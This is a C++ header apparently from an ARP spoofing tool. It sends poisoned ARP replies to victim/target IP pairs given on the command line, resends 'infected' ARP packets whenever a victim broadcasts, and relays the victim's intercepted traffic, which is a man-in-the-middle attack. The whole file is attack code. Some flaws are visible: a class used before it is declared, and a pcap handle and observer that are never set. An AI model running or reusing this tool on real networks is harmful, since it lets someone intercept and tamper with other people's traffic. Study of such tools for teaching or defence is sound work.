#pragma once

#include <stdint.h>
#include "received_packet.h"
#include "ip.h"
#include "packet.h"

class ObserveQueue : public Observer {
private:
    RootManager& rootManager = RootManager::getInstance();
    ReceivedPacket& receivedPacket = ReceivedPacket::getInstance();
public:
    void update(uint16_t type) override {
        if (type == EthHdr::Arp) {
            EthArpPacket arp_packet = receivedPacket.popArp();
            if (arp_packet.isNULL()) return;
            rootManager.arp_infection_packet_send(arp_packet);
        }
        else {
            vector<u_char> packet = receivedPacket.popRelay();
            if (packet.empty()) return;
            rootManager.relay_packet_send(packet);
        }
    }
};

class RootManager {
private :
    char *interface;
    ReceivedPacket& receivedPacket = ReceivedPacket::getInstance();
    vector<AttackPacket> attacks;
    vector<thread> threads;
    pcap_t *handle;
    shared_ptr<ObserveQueue> observer;
    char errbuf[PCAP_ERRBUF_SIZE];

    RootManager() {}
    RootManager(const RootManager&) = delete;
    RootManager& operator=(const RootManager&) = delete;
    ~RootManager() {}

public :
    static RootManager& getInstance() {
        static RootManager instance;
        return instance;
    }

    void init(int argc, char *argv[], pcap_t *handle) {
        int do_count = int((argc - 1) / 2);
        interface = argv[0];

        for (int i = 0; i < do_count; i++) {
            attacks.push_back(AttackPacket(interface, handle, Ip(argv[i*2+1]), Ip(argv[(i+1)*2])));
            attacks.at(i).set_attack_packet();
            attacks.at(i).send_my_packet();
            printf("[*] Send first attack packet (%s) (%s)\n", attacks.at(i).senderIp, attacks.at(i).targetIp);
        }
        receivedPacket.attach(observer);
    }

    void start_receive() {
        receivedPacket.receive_start(handle);
    }

    void arp_infection_packet_send(EthArpPacket& packet) {
        for (AttackPacket attack : attacks) {
            if (attack.is_broadcast_from_sender(packet)) {
                printf("[*] Arp Broadcase packet is Detected from %s\n", packet.arp_.sip());
                attack.set_attack_packet();
                attack.send_my_packet();
                printf("[*] Resend infected Arp Packet to %s\n", packet.arp_.sip());
                return ;
            }
        }
        printf("[*] Unknown arp packet is detected from %s \n", packet.arp_.sip());
    }

    void relay_packet_send(vector<u_char>& packet) {
        EthHdr *ethhdr = reinterpret_cast<EthHdr *>(packet.data());
        for (AttackPacket attack : attacks) {
            if (ethhdr->smac() == attack.senderMac) {
                printf("[*] Normal Packet is detected from %s\n", attack.senderIp);
                attack.relay_send(packet);
                printf("[*] Relay Packet to %s\n", attack.targetIp);
            }
        }
        printf("[*] Unkown packet Detected\n");
    }
};